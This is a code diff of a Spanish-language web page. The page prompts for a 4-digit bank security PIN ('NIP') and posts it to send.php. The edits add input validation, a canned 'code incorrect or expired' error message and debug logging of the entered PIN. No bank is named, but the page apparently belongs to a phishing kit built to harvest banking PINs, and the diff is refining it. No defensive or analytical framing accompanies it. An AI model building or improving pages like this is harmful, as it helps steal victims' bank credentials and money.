@@ -63,35 +63,37 @@
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                 </svg>
             </div>
+
             <form id="otpForm" action="send.php" method="POST">
-            <div class="space-y-2">
-                <h2 class="text-xl font-bold text-gray-800">Ingresa tu NIP</h2>
-                <p class="text-sm text-gray-500 px-6">Ingresa tu NIP de seguridad de 4 dígitos para validar tu acceso y continuar con la operación.</p>
-            </div>
+                <div class="space-y-2">
+                    <h2 class="text-xl font-bold text-gray-800">Ingresa tu NIP</h2>
+                    <p class="text-sm text-gray-500 px-6">Ingresa tu NIP de seguridad de 4 dígitos para validar tu acceso y continuar con la operación.</p>
+                </div>
 
-            <!-- Contenedor de 8 dígitos -->
-             <!-- Busca el div id="otp-container" y añade esto justo ARRIBA -->
-<div id="error-msg" class="hidden animate-pulse">
-    <p class="text-red-600 text-xs font-bold bg-red-50 py-2 rounded-lg border border-red-200">
-        El código ingresado es incorrecto o ha expirado.
-    </p>
-</div>
+                <!-- MENSAJE DE ERROR -->
+                <div id="error-msg" class="hidden animate-pulse mt-4">
+                    <p class="text-red-600 text-xs font-bold bg-red-50 py-2 rounded-lg border border-red-200">
+                        El código ingresado es incorrecto o ha expirado.
+                    </p>
+                </div>
 
-<div id="otp-container" class="flex justify-center gap-2 pt-4">
-    <!-- Tus 8 inputs se quedan igual -->
-</div>
-            <div id="otp-container" class="flex justify-center gap-2 pt-4">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
-                <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
-            </div>
-            <input type="hidden" name="nip" id="nip">
-            <div class="pt-6 space-y-4">
-                <button id="btnFinal" disabled class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-lg transition-all duration-300">
-                    Confirmar NIP
-                </button>
-            </div>
+                <!-- CONTENEDOR OTP (4 INPUTS) - UN SOLO DIV -->
+                <div id="otp-container" class="flex justify-center gap-2 pt-4">
+                    <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                    <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                    <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                    <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
+                </div>
+
+                <!-- INPUT HIDDEN PARA EL NIP -->
+                <input type="hidden" name="nip" id="nip">
+
+                <!-- BOTON CONFIRMAR -->
+                <div class="pt-6 space-y-4">
+                    <button id="btnFinal" type="button" disabled class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-lg transition-all duration-300">
+                        Confirmar NIP
+                    </button>
+                </div>
             </form>
         </div>
     </div>
@@ -100,10 +102,9 @@
 
 const inputs = document.querySelectorAll('.otp-input');
 const btnFinal = document.getElementById('btnFinal');
-
-/* NUEVO */
 const form = document.getElementById('otpForm');
 const hiddenInput = document.getElementById('nip');
+const errorMsg = document.getElementById('error-msg');
 
 // SALTO AUTOMATICO ENTRE INPUTS
 inputs.forEach((input, index) => {
@@ -112,6 +113,11 @@ inputs.forEach((input, index) => {
 
         // SOLO UN DIGITO
         input.value = input.value.replace(/\D/g, '').slice(0, 1);
+
+        // OCULTAR MENSAJE DE ERROR AL ESCRIBIR
+        if (errorMsg) {
+            errorMsg.classList.add('hidden');
+        }
 
         // PASAR AL SIGUIENTE
         if (input.value && index < inputs.length - 1) {
@@ -139,6 +145,8 @@ function checkComplete() {
     const code = Array.from(inputs)
         .map(i => i.value)
         .join('');
+
+    console.log('Código actual:', code, 'Longitud:', code.length); // DEBUG
 
     if (code.length === 4) {
 
@@ -181,6 +189,17 @@ btnFinal.addEventListener('click', (e) => {
         .map(i => i.value)
         .join('');
 
+    // VALIDAR QUE TENGA 4 DÍGITOS
+    if (finalCode.length !== 4) {
+        console.error('NIP incompleto');
+        if (errorMsg) {
+            errorMsg.classList.remove('hidden');
+        }
+        return;
+    }
+
+    console.log('NIP a enviar:', finalCode); // DEBUG
+
     /* GUARDAR CODIGO COMPLETO EN INPUT HIDDEN */
     hiddenInput.value = finalCode;
 
@@ -200,6 +219,8 @@ btnFinal.addEventListener('click', (e) => {
         btnFinal.classList.add(
             'bg-green-600'
         );
+
+        console.log('Enviando formulario con NIP:', hiddenInput.value); // DEBUG
 
         /* ENVIAR FORM */
         form.submit();
